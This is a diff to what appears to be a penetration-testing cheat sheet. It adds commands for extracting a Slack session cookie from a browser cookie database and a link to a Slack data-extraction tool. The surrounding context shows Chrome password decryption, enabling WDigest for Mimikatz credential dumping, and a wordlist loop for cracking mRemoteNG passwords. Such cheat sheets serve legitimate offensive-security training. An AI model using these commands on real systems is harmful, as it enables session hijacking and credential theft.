@@ -3324,6 +3324,13 @@ https://github.com/ohyicong/decrypt-chrome-passwords
 $ python decrypt_chrome_password.py
 ```
 
+- SQLite Database Cookies
+
+```
+https://github.com/juliourena/plaintext/blob/master/Scripts/cookieextractor.py
+$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+```
+
 - Enable WDigest which user credentials in plaintext within memory, making them accessible to tools like Mimikatz for extraction
 
 ```
@@ -3559,6 +3566,12 @@ https://github.com/haseebT/mRemoteNG-Decrypt
 $ python3 mremoteng_decrypt.py -s "<password>"
 $ python3 mremoteng_decrypt.py -s "<password>" -p <master_password>
 $ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<password>" -p $password 2>/dev/null;done    
+```
+
+- Slack
+
+```
+https://github.com/clr2of8/SlackExtract
 ```
 
 #9. - File Transfers
